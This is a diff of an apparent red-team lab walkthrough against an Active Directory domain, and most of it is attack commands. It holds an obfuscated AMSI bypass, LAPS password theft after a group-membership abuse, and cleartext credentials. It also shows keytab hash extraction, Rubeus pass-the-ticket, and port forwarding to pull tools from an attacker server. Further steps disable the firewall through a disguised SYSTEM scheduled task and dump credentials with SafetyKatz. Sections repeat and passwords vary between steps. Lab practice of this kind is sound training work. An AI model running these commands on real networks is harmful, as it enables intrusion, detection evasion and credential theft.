-<figure><img src="../../assets/crtm/image 41.png" alt="AppServers Computers"/></figure>
-
-<p>We can see that inside AppServers OU we have only one computer, and its named as <code>IT-APPSRV01</code>. Let's now read this computer's local admin's password with ADModule.</p>
-
-<p><code>Get-ADGroupMember -Identity 'LocalAdmins'</code></p>
-
-<figure><img src="../../assets/crtm/image 42.png" alt="LocalAdmins Members"/></figure>
-
-<p><code>Add-ADGroupMember -Identity 'LocalAdmins' -Members 'itemployee41' -Verbose</code></p>
-
-<figure><img src="../../assets/crtm/image 43.png" alt="Add to LocalAdmins"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'LocalAdmins'</code></p>
-
-<figure><img src="../../assets/crtm/image 44.png" alt="LocalAdmins Updated"/></figure>
-
-<p>After adding the user, We need to logout and login for this adding to reflect on our side.</p>
-
-<h3>before logout/login</h3>
-
-<figure><img src="../../assets/crtm/image 45.png" alt="Before Logout"/></figure>
-
-<h3>After logout/login</h3>
-
-<figure><img src="../../assets/crtm/image 46.png" alt="After Login"/></figure>
-
-<p>It is possible to see now that we are now part of IT\LocalAdminsWe can now Read the Local Admins's password of  <code><strong>IT-APPSRV01</strong></code>.</p>
-
-<h3>Reading LAPS Credentials with ADModule</h3>
-
-<p><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p>
-
-<p><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p>
-
-<p><code>Get-ADComputer -Identity 'IT-APPSRV01' -Properties 'ms-mcs-admpwd'</code></p>
-
-<figure><img src="../../assets/crtm/image 47.png" alt="LAPS Password"/></figure>
-
-<p>Now we let's try to access IT-APPSRV01 as local administrator.</p>
-
-<p><code>winrs -r:IT-APPSRV01 -u:'\IT-APPSRV01' -p:'8dPII$cXXPkA4K' cmd</code></p>
-
-<figure><img src="../../assets/crtm/image 48.png" alt="WinRS Error"/></figure>
-
-<p>WinRS is using <strong>Kerberos</strong> by default for authentication, but our context might not align with the expected domain settings, causing a failure. The error code <code>0x80090311</code> indicates that the <strong>Kerberos authentication</strong> cannot be performed because your current session might not have an appropriate <strong>Kerberos ticket</strong> for the domain.</p>
-
-<p>We can fix this issue by using <strong>NTLM authentication</strong> instead of Kerberos. We can force this by adding the remote host to the <strong>TrustedHosts</strong> list on PowerShell.
-Note: Wrapping it inside the single quotes is only applied when executing it in PowerShell, not in CMD.
-<code>winrm set winrm/config/client '@{TrustedHosts="IT-APPSRV01"}'</code></p>
-
-<figure><img src="../../assets/crtm/image 49.png" alt="TrustedHosts"/></figure>
-
-<p><code>winrs -r:IT-APPSRV01 -u:'.\Administrator' -p:'a%0Y4I8544Pz+8' cmd</code></p>
-
-<figure><img src="../../assets/crtm/image 50.png" alt="WinRS Access"/></figure>
-
-<p>Since <strong>keytab</strong> files store encrypted credentials (Kerberos principals), and we found one related to a SQL Server (<code>sqlsrv02</code>) could allow us to authenticate as that service or impersonate it, depending on how the keytab was configured and what it contains.</p>
-
-<p>Let's extract this .keytab file from  the remote host first.</p>
-
-<pre><code># Create credential object without popup
+REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre></div><div dir="ltr"><figure class="image"><a><img style="width:1683px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Once the new PowerShell session is initiated after running InvisiShell, we can then execute the following AMSI bypass into the current session.</p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )</code></pre></div><div dir="ltr"><figure class="image"><a><img style="width:1683px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Import-Module .\ADModule-master\Microsoft.ActiveDirectory.Management.dll</code></p></div><div dir="auto"><p class=""><code>Import-Module .\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p></div><div dir="auto"><p class=""><code>Import-Module .\</code><code><a href="http://admpwd.ps/">AdmPwd.PS</a></code><code>\AdmPwd.PS.psd1 -Verbose</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Now that we have imported the 2 modules, Let’s enumerate the Organizational Unit where LAPS is configured.<br/>For that we will use the script <code>Get-LapsPermissions.ps1</code>.</p></div><div dir="auto"><p class=""><code>.\Get-LAPSPermissions.ps1 -Verbose</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li><strong>Read Rights:</strong><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>OrganizationalUnit</strong>: This indicates the Organizational Unit (OU) in Active Directory where the permission is applied. <div dir="auto"><p class=""><code>OU=AppServers,DC=it,DC=gcb,DC=local</code></p></div><div dir="auto"><p class="">This is the Mail Management OU under the <code>it.gcb.local</code> domain.</p></div></li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>IdentityReference</strong>: This is the security principal (user or group) that has been granted <strong>read access</strong> to the LAPS password stored in the <code>ms-Mcs-AdmPwd</code> attribute.<div dir="auto"><p class=""><code>it\LocalAdmins</code></p></div><div dir="auto"><p class="">This means the <code>LocalAdmins</code> group in the <code>IT</code> domain has the right to <strong>read</strong> the local administrator passwords for computers in this OU.</p></div></li></ul></div><div dir="auto"><p class="">
+</p></div></li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li><strong>Write Rights:</strong><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>OrganizationalUnit</strong>: Again, this is the OU where the permission is applied, which is the same as the read rights (<code>OU=AppServers</code>).</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>IdentityReference</strong>: This indicates the security principal with <strong>write access</strong> to the LAPS attributes.<div dir="auto"><p class=""><code>NT AUTHORITY\SELF</code></p></div><div dir="auto"><p class="">This means that the computer account (via the SELF security principal) can <strong>write its own password</strong> (e.g., update the <code>ms-Mcs-AdmPwd</code> attribute) to Active Directory. <br/>This is a standard LAPS configuration.</p></div></li></ul></div></li></ol></div><div dir="auto"><h3 class="">Interpretation:</h3></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>Read Rights</strong>: The <code><strong>TI\LocalAdmins</strong></code> group has permission to retrieve the local admin passwords for machines in the <code><strong>AppServers</strong></code> OU.</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>Write Rights</strong>: Each computer in the AppServers OU is configured to write its local admin password to its corresponding AD attribute.</li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">We can see with our enumeration that LocalAdmins group have the Read Right permission for LAPS configuration, meaning that members of LocalAdmins group can read the clear-text password.<br/>As member of ITEmployeesUsers group we have <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. Let’s take advantage of the <code><strong>WriteProperty</strong></code> and Add ourselves as member of LocalAdmins group. </p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Let’s now enumerate all the Computers that belong to AppServers OU using ADModule.</p></div><div dir="auto"><p class=""><code>Get-ADOrganizationalUnit -Identity 'OU=AppServers,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select 'Name’</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.949951171875px"/></a></figure></div><div dir="auto"><p class="">We can see that inside AppServers OU we have only one computer, and its named as <code>IT-APPSRV01</code>. Let’s now read this computer’s local admin’s password with ADModule.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'LocalAdmins'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Add-ADGroupMember -Identity 'LocalAdmins' -Members 'itemployee41' -Verbose</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9000244140625px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'LocalAdmins'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">After adding the user, We need to logout and login for this adding to reflect on our side. </p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">before logout/login </h3></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><h3 class="">After logout/login</h3></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">It is possible to see now that we are now part of IT\LocalAdminsWe can now Read the Local Admins’s password of  <code><strong>IT-APPSRV01</strong></code>.</p></div><div dir="auto"><h3 class="">Reading LAPS Credentials with ADModule</h3></div><div dir="auto"><p class=""><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p></div><div dir="auto"><p class=""><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p></div><div dir="auto"><p class=""><code>Get-ADComputer -Identity 'IT-APPSRV01' -Properties 'ms-mcs-admpwd'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Computer Account: IT-APPSRV01<br/>Password: 8dPII$cXXPkA4K</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Now we let’s try to access IT-APPSRV01 as local administrator.</p></div><div dir="auto"><p class=""><code>winrs -r:IT-APPSRV01 -u:'.\IT-APPSRV01' -p:'8dPII$cXXPkA4K' cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">WinRS is using <strong>Kerberos</strong> by default for authentication, but our context might not align with the expected domain settings, causing a failure. The error code <code>0x80090311</code> indicates that the <strong>Kerberos authentication</strong> cannot be performed because your current session might not have an appropriate <strong>Kerberos ticket</strong> for the domain.</p></div><div dir="auto"><p class="">We can fix this issue by using <strong>NTLM authentication</strong> instead of Kerberos. We can force this by adding the remote host to the <strong>TrustedHosts</strong> list on PowerShell.<br/>Note: Wrapping it inside the single quotes is only applied when executing it in PowerShell, not in CMD.<br/><code>winrm set winrm/config/client '@{TrustedHosts="IT-APPSRV01"}'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Now we can successfully connect it.</p></div><div dir="auto"><p class=""><code>winrs -r:IT-APPSRV01 -u:'.\Administrator' -p:'8dPII$cXXPkA4K' cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">We were able to compromise server <code><strong>APPSRV01</strong></code>.</p></div><div dir="auto"><p class="">After some enumeration, I noticed that we are inside a Linux server and the access i had using WinRS was a bit buggy. So I decided to enumerate by sending commands straight to the machine.<br/>Our enumerations that we have local Administrators.</p></div><div dir="auto"><p class=""><code>winrs -r:IT-APPSRV01 -u:'.\Administrator' -p:'{j;c]7UFr8xHkg' powershell -Command 'whoami'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">We can see above that we are Administrator inside host IT-APPSRV01. AMAZING.</p></div><div dir="auto"><p class=""><code>winrs -r:IT-APPSRV01 -u:'.\Administrator' -p:'{j;c]7UFr8xHkg' powershell -Command 'dir -force ../../Ubuntu/rootfs/root'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9666748046875px"/></a></figure></div><div dir="auto"><p class="">While doing the enumeration, I was able to find a file named <code>sqlsrv02.keytab</code> inside the root folder.</p></div><div dir="auto"><p class="">A <code><strong>.keytab</strong></code> file (short for <strong>key table</strong>) is a file used to store <strong>Kerberos principals and their encrypted keys</strong>. It is primarily used in environments that leverage <strong>Kerberos authentication</strong>, such as Active Directory (AD) or Unix-based systems that use Kerberos for secure authentication.<br/>A <strong>keytab</strong> file serves as a secure way to authenticate a service or user without requiring manual password input. It stores one or more <strong>Kerberos principals</strong> along with their corresponding <strong>encrypted keys</strong>.</p></div><div dir="auto"><h3 class=""><strong>Key Use Cases:</strong></h3></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li><strong>Automated Authentication:</strong><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">Services (like web servers, SSH, or LDAP) use keytab files to automatically authenticate with a Kerberos Key Distribution Center (KDC) without user intervention.</li></ul></div></li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li><strong>Single Sign-On (SSO):</strong><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">In AD environments, keytabs allow for seamless authentication between systems without requiring users to manually enter credentials.</li></ul></div></li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li><strong>Service Accounts:</strong><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">Applications and services that need to interact with other services securely use keytabs to acquire Kerberos tickets.</li></ul></div></li></ol></div><div dir="auto"><ol class="numbered-list" start="4" type="1"><li><strong>Cross-Platform Authentication:</strong><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">Unix/Linux systems joined to a Windows domain use keytab files to authenticate to AD services.</li></ul></div></li></ol></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Since <strong>keytab</strong> files store encrypted credentials (Kerberos principals), and we found one related to a SQL Server (<code>sqlsrv02</code>) could allow us to authenticate as that service or impersonate it, depending on how the keytab was configured and what it contains.</p></div><div dir="auto"><p class="">Let’s extract this .keytab file from  the remote host first.</p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash"># Create credential object without popup
 $username = ".\Administrator" 
 $password = 'a%0Y4I8544Pz+8' | ConvertTo-SecureString -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($username, $password)
@@ -1465,129 +967,23 @@ if (!(Test-Path $localDir)) { New-Item -Path $localDir -ItemType Directory }
 
 # Get file content from remote server and write locally 
 $fileContent = Invoke-Command -ComputerName $remoteServer -Credential $cred -ScriptBlock { Get-Content -Path $Using:remotePath -Raw }
-$fileContent | Set-Content -Path $localPath</code></pre>
-
-<p><code>dir</code></p>
-
-<figure><img src="../../assets/crtm/image 53.png" alt="Keytab File"/></figure>
-
-<p>Now we  do have several ways to read this file and extract credentials from it, but unfortunately, I found no ways to do it via Windows. I had to extract this file into my Kali Linux and use the following python script from Github to be able to extract those credentials from the file. <a href="https://github.com/sosdave/KeyTabExtract">https://github.com/sosdave/KeyTabExtract</a></p>
-
-<p><code>python3 keytabextract.py sqlsrv02.keytab</code></p>
-
-<pre><code>[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+$fileContent | Set-Content -Path $localPath</code></pre></div><div dir="auto"><p class=""><code>dir</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Now we  do have several ways to read this file and extract credentials from it, but unfortunately, I found no ways to do it via Windows. I had to extract this file into my Kali Linux and use the following python script from Github to be able to extract those credentials from the file. <a href="https://github.com/sosdave/KeyTabExtract">https://github.com/sosdave/KeyTabExtract</a></p></div><div dir="auto"><p class=""><code>python3 </code><code><a href="http://keytabextract.py/">keytabextract.py</a></code><code> sqlsrv02.keytab</code></p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
 [!] Unable to identify any AES256-CTS-HMAC-SHA1 hashes.
 [!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
 [+] Keytab File successfully imported.
 	REALM : it.gcb.local
 	SERVICE PRINCIPAL : sqlsvc/
-	NTLM HASH : 7782d820e5e5952b20b77a2240a03bbc</code></pre>
-
-<p>We were able to find credentials for an SQL service account. With this new creds, let's start by elevating our privileges as sqlsvc user and to accomplish this task we can use Rubeus.</p>
-
-<h2>PortForwarding</h2>
-
-<p>Before we move on, I just decided to make our next steps more stealthy. Let's create a portforwarding pointing all our requests into our <a href="http://localhost">localhost</a> IP, this way defense mechanisms like Defender for example, won't see our next requests to external scripts or .NET EXEs like Rubeus or even SafetyKatz as malicious requests. Let's use <code>netsh</code> to accomplish this task.</p>
-
-<p><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=443 connectaddress=192.168.99.41</code></p>
-
-<figure><img src="../../assets/crtm/image 54.png" alt="Port Forwarding"/></figure>
-
-<p>Basically we are telling the host that. whatever request is make from <a href="http://localhost">localhost</a> IP 127.0.0.1, must be forwarded to our malicious server containing our needed files. 
-<mark class="highlight-red">NOTE: ON MY LINUX SERVER I'M HOSTING A FOLDER CONTAINING ALL TOOLS I'LL NEED AND I'M USING PYTHON3 FOR THAT </mark><mark class="highlight-red"><code>python3 -m http.server 443</code></mark><mark class="highlight-red">.</mark>
-Let's test our portforwarding now by importing PowerView.ps1 into the memory. This method will allow us store PowerView module into the memory without even touching the physical disk.</p>
-
-<h2>Forging  SQLSVC  (TGT)Ticket Granting Ticket</h2>
-
-<p>Now that we do have Imported our shellcode Loader, we can run Rubeus from the memory and elevate our privileges as <code><strong>sqlsvc</strong></code> by requesting its Ticket Granting Ticket.
-Remember that we are doing it using the shellcode loader, so the command should be the following:</p>
-
-<p><code>C:\Users\itemployee41\Documents\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args "asktgt" /user:sqlsvc /rc4:7782d820e5e5952b20b77a2240a03bbc /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
-
-<figure><img src="../../assets/crtm/image 55.png" alt="Rubeus TGT"/></figure>
-
-<p>Now that we were able to elevate our privilege to sqlsvc by requesting its Ticket Granting Ticket, we can try to access IT-SQLSRV02 host. You might be wondering why exactly the IT-SQLSRV02 server? Well, If you remember, our .keytab file, uses exactly the same name of the server it connects IT-SQLSRV02.keytab.</p>
-
-<h2>Accessing IT-SQLSRV02 with WinRS</h2>
-
-<p>We can use WinRS to access IT-SQLSRV02 server, but instead of accessing the server remotely, I'll simple send commands to the server and get the output.</p>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command '$env:ComputerName'</code></p>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command '$env:UserName'</code></p>
-
-<figure><img src="../../assets/crtm/image 56.png" alt="IT-SQLSRV02 Access"/></figure>
-
-<p>OK, we have access to the server.</p>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command 'whoami /all'</code></p>
-
-<figure><img src="../../assets/crtm/image 57.png" alt="whoami all"/></figure>
-
-<h2>Disabling Firewall on SQLSRV02</h2>
-
-<p>Now that we do have Local Admin access into SQLSRV02, let's start by disabling Firewall, this avoids Defender to detect and report our malicious actions.</p>
-
-<p>Using the scheduled task method via WinRS is an effective choice for disabling the firewall for several strategic reasons:</p>
-
-<ol>
-<li><strong>Legitimate Administrative Channel</strong>: WinRS (Windows Remote Shell) is a built-in Windows administrative tool that's less likely to trigger security alerts compared to more exotic command execution methods.</li>
-<li><strong>SYSTEM Privileges</strong>: By creating a scheduled task that runs as SYSTEM, we executed the firewall disabling command with the highest local privilege level, bypassing any potential UAC (User Account Control) restrictions.</li>
-<li><strong>Minimal Footprint</strong>: The approach leaves minimal forensic evidence - we create a task, execute it immediately, then delete it, minimizing the time the suspicious configuration exists on the system.</li>
-<li><strong>Indirect Execution</strong>: Rather than directly disabling the firewall from our session, we instructed the system...</li>
-</ol>
-
-<h3><code># Create the scheduled task to disable firewall</code></h3>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "schtasks /create /tn 'SystemUpdate' /tr 'cmd.exe /c netsh advfirewall set allprofiles state off' /sc once /st 00:00 /ru SYSTEM /f"</code></p>
-
-<figure><img src="../../assets/crtm/image 58.png" alt="Create Task"/></figure>
-
-<h3># Run the scheduled task immediately</h3>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "schtasks /run /tn 'SystemUpdate'"</code></p>
-
-<figure><img src="../../assets/crtm/image 59.png" alt="Run Task"/></figure>
-
-<h3># Verify the firewall status (optional)</h3>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "netsh advfirewall show allprofiles state"</code></p>
-
-<figure><img src="../../assets/crtm/image 60.png" alt="Verify Firewall"/></figure>
-
-<h3>Copy File into IT-SQLSRV02</h3>
-
-<p><code>echo F | XCOPY C:\Users\itemployee41\Documents\Loader.exe \\IT-SQLSRV02\C$\</code></p>
-
-<figure><img src="../../assets/crtm/image 62.png" alt="Copy File"/></figure>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "dir -force 'C:\'"</code></p>
-
-<figure><img src="../../assets/crtm/image 63.png" alt="Verify Copy"/></figure>
-
-<h3>Portforwarding on IT-SQLSRV02 → Attacking Workstation</h3>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.100.41"</code></p>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "netsh interface portproxy show all"</code></p>
-
-<figure><img src="../../assets/crtm/image 64.png" alt="Port Forwarding SQLSRV02"/></figure>
-
-<h3>Portforwarding Attacking Workstation → Attacking Server</h3>
-
-<p><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.99.41</code></p>
-
-<p><code>netsh interface portforwarding show all</code></p>
-
-<figure><img src="../../assets/crtm/image 65.png" alt="Port Forwarding Workstation"/></figure>
-
-<h3>Dumping credentials from IT-SQLSRV02</h3>
-
-<p><code>winrs -r:IT-SQLSRV02 powershell -Command "C:\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args 'sekurlsa::ekeys' 'exit'"</code></p>
-
-<details class="toggle">
-<summary><strong>ekeys</strong></summary>
-<pre><code>mimikatz(commandline) # sekurlsa::ekeys
+	NTLM HASH : 7782d820e5e5952b20b77a2240a03bbc</code></pre></div><div dir="auto"><p class="">We were able to find credentials for an SQL service account. With this new creds, let’s start by elevating our privileges as sqlsvc user and to accomplish this task we can use Rubeus.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">PortForwarding </h2></div><div dir="auto"><p class="">Before we move on, I just decided to make our next steps more stealthy. Let’s create a portforwarding pointing all our requests into our <a href="http://localhost">localhost</a> IP, this way defense mechanisms like Defender for example, won’t see our next requests to external scripts or .NET EXEs like Rubeus or even SafetyKatz as malicious requests. Let’s use <code>netsh</code> to accomplish this task.</p></div><div dir="auto"><p class=""><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=443 connectaddress=192.168.99.41</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Basically we are telling the host that. whatever request is make from <a href="http://localhost">localhost</a> IP 127.0.0.1, must be forwarded to our malicious server containing our needed files. <br/><mark class="highlight-red">NOTE: ON MY LINUX SERVER I’M HOSTING A FOLDER CONTAINING ALL TOOLS I’LL NEED AND I’M USING PYTHON3 FOR THAT </mark><mark class="highlight-red"><code>python3 -m http.server 443</code></mark><mark class="highlight-red">.<br/></mark>Let’s test our portforwarding now by importing PowerView.ps1 into the memory. This method will allow us store PowerView module into the memory without even touching the physical disk.</p></div><div dir="auto"><p class="">Let’s start by importing our ShellCode Loader, This way we can simply run .NET EXEs from the memory and we do not need to store them into our target machine. This will basically be the only tool we will import into our target workstation. </p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Forging  SQLSVC  (TGT)Ticket Granting Ticket</h2></div><div dir="auto"><p class="">Now that we do have Imported our shellcode Loader, we can run Rubeus from the memory and elevate our privileges as <code><strong>sqlsvc</strong></code> by requesting its Ticket Granting Ticket.<br/>Remember that we are doing it using the shellcode loader, so the command should be the following:</p></div><div dir="auto"><p class=""><code>C:\Users\itemployee41\Documents\Loader.exe -Path </code><code><a href="http://127.0.0.1:8080/Rubeus.exe">http://127.0.0.1:443/Rubeus.exe</a></code><code> -args "asktgt" /user:sqlsvc /rc4:7782d820e5e5952b20b77a2240a03bbc /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Now that we were able to elevate our privilege to sqlsvc by requesting its Ticket Granting Ticket, we can try to access IT-SQLSRV02 host. You might be wondering why exactly the IT-SQLSRV02 server? Well, If you remember, our .keytab file, uses exactly the same name of the server it connects IT-SQLSRV02.keytab.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Accessing IT-SQLSRV02 with WinRS</h2></div><div dir="auto"><p class="">We can use WinRS to access IT-SQLSRV02 server, but instead of accessing the server remotely, I’ll simple send commands to the server and get the output.</p></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command '$env:ComputerName'</code> </p></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command '$env:UserName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1230.9666748046875px"/></a></figure></div><div dir="auto"><p class="">OK, we have access to the server.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command 'whoami /all'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Disabling Firewall on SQLSRV02</h2></div><div dir="auto"><p class="">Now that we do have Local Admin access into SQLSRV02, let’s start by disabling Firewall, this avoids Defender to detect and report our malicious actions.</p></div><div dir="auto"><p class="">Using the scheduled task method via WinRS is an effective choice for disabling the firewall for several strategic reasons:</p></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li><strong>Legitimate Administrative Channel</strong>: WinRS (Windows Remote Shell) is a built-in Windows administrative tool that's less likely to trigger security alerts compared to more exotic command execution methods.</li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li><strong>SYSTEM Privileges</strong>: By creating a scheduled task that runs as SYSTEM, we executed the firewall disabling command with the highest local privilege level, bypassing any potential UAC (User Account Control) restrictions.</li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li><strong>Minimal Footprint</strong>: The approach leaves minimal forensic evidence - we create a task, execute it immediately, then delete it, minimizing the time the suspicious configuration exists on the system.</li></ol></div><div dir="auto"><ol class="numbered-list" start="4" type="1"><li><strong>Indirect Execution</strong>: Rather than directly disabling the firewall from our session, we instructed the system to do it itself via the scheduled task mechanism, adding a layer of indirection that can help evade certain detection rules.</li></ol></div><div dir="auto"><ol class="numbered-list" start="5" type="1"><li><strong>Benign Naming</strong>: Using a generic name like "SystemUpdate" for the task helped avoid immediate suspicion in task logs or monitoring systems.</li></ol></div><div dir="auto"><p class="">This technique successfully disables the Windows Firewall, clearing the path for our credential dumping activities while minimizing the risk of triggering defensive measures.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class=""><mark class="highlight-default"><code># Create the scheduled task to disable firewall</code></mark></h3></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "schtasks /create /tn 'SystemUpdate' /tr 'cmd.exe /c netsh advfirewall set allprofiles state off' /sc once /st 00:00 /ru SYSTEM /f"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><h3 class=""># Run the scheduled task immediately</h3></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "schtasks /run /tn 'SystemUpdate'"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1230.949951171875px"/></a></figure></div><div dir="auto"><h3 class=""># Verify the firewall status (optional)</h3></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "netsh advfirewall show allprofiles state"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><h3 class=""># Delete the scheduled task to clean up</h3></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "schtasks /delete /tn 'SystemUpdate' /f"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">This approach has several advantages:</p></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li>It uses WinRS whic h is an admin tool that's often allowed in environments</li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li>Using a scheduled task that runs as SYSTEM helps bypass potential UAC restrictions</li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li>The task is promptly deleted, reducing artifacts left behind</li></ol></div><div dir="auto"><ol class="numbered-list" start="4" type="1"><li>The innocuous task name "<strong>SystemUpdate</strong>" helps avoid immediate suspicion</li></ol></div><div dir="auto"><p class="">After disabling the firewall, you should be able to proceed with your credential dumping activities with reduced interference from Windows Defender's network protection features.</p></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command 